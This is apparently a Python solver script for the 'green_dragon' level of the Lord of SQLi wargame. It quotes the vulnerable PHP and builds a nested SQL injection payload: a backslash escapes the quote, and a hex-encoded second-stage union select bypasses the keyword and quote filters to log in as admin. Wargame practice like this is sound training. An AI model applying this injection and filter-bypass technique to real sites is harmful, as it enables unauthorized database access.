#!/usr/bin/env python3
import los


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'select id from prob_dark_eyes' in args[0]


def main():
    '''
    Green_dragon

    if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysqli_fetch_array(mysqli_query($db,$query));
    if($result['id']){
      if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
      if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
      $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
      echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
      $result = mysqli_fetch_array(mysqli_query($db,$query2));
      if($result['id'] == "admin") solve("green_dragon");
    }
    '''

    url = "https://los.rubiya.kr/chall/green_dragon_74d944f888fd3f9cf76e4e230e78c45b.php"
    cook = los.check_cookies(url)

    level2_payload = 'union select 0x61646d696e#'
    p = ''.join(hex(ord(x))[2:] for x in level2_payload)
    print(level2_payload, ' = ', p)

    payload = f"union select 0x5c,0x{p}#"
    param = {'id': '\\', 'pw': payload}
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Green_dragon Clear!')


if __name__ == '__main__':
    main()
